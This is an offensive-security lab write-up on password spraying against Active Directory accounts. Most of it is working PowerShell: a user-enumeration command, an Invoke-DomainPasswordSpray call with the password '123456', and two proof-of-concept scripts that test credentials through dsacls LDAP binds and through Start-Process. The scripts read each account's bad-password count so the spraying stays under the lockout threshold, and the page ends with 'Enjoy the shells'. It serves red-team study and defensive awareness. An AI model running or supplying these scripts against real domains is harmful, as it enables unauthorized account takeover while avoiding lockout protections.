# Active Directory Password Spraying

This lab explores ways of password spraying against Active Directory accounts.

## Invoke-DomainSpray

{% code title="attacker@victim" %}
```csharp
Get-ADUser -Properties name -Filter * | Select-Object -ExpandProperty name |  Out-File users.txt
type users.txt
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2019-03-20-21-29-13.png)

{% code title="attacker@victim" %}
```csharp
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2019-03-20-21-32-37.png)

## Spraying using dsacls

While I was poking around with dsacls for enumerating AD object permissions

{% page-ref page="using-dsacls-to-check-ad-object-permissions.md" %}

I noticed that one could attempt to bind to LDAP using specific AD credentials, so a dirty AD password spraying POC came about:

{% code title="attacker@victim" %}
```csharp
$domain = ((cmd /c set u)[-3] -split "=")[-1]
$pdc = ((nltest.exe /dcname:$domain) -split "\\\\")[1]
$lockoutBadPwdCount = ((net accounts /domain)[7] -split ":" -replace " ","")[1]
$password = "123456"

# (Get-Content users.txt)
"krbtgt","spotless" | % {
    $badPwdCount = Get-ADObject -SearchBase "cn=$_,cn=users,dc=$domain,dc=local" -Filter * -Properties badpwdcount -Server $pdc | Select-Object -ExpandProperty badpwdcount
    if ($badPwdCount -lt $lockoutBadPwdCount - 3) {
        $isInvalid = dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:$_@offense.local /passwd:$password | select-string -pattern "Invalid Credentials"
        if ($isInvalid -match "Invalid") {
            Write-Host "[-] Invalid Credentials for $_ : $password" -foreground red
        } else {
            Write-Host "[+] Working Credentials for $_ : $password" -foreground green
        }        
    }
}
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2019-03-20-00-10-10.png)

## Spraying with Start-Process

Similarly to dsacls, it's possible to spray passwords with `Start-Process` cmdlet and the help of PowerView's cmdlets:

{% code title="spray-ldap.ps1" %}
```csharp
# will spray only users that currently have 0 bad password attempts
# dependency - powerview

function Get-BadPasswordCount {
    param(
        $username = "username",
        $domain = "offense.local"
    )
    $pdc = (get-netdomain -domain $domain).PdcRoleOwner
    $badPwdCount = (Get-NetUser $username -Domain $domain -DomainController $pdc.name).badpwdcount
    return $badPwdCount
}

$users = Get-netuser -properties samaccountname | Select-Object -ExpandProperty samaccountname
$domain = "offense.local"
$password = "123456"

Write-Host $users.Count users supplied; $users | % {
    $badPasswordCount = Get-BadPasswordCount -username $_ -Domain $domain
    if ($badPasswordCount -lt 0) {
        Write-Host Spraying : -NoNewline; Write-host -ForegroundColor Green " $_"
        $credentials = New-Object System.Management.Automation.PSCredential -ArgumentList @("$domain\$_",(ConvertTo-SecureString -String $password -AsPlainText -Force))
        Start-Process cmd -Credential ($credentials)
    } else {
        Write-Host "Ignoring $_ with $badPasswordCount badPwdCount" -ForegroundColor Red
    }
}
```
{% endcode %}

Enjoy the shells:

![](../../.gitbook/assets/spraying.gif)

## References

{% embed url="https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1" %}

{% embed url="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon" %}





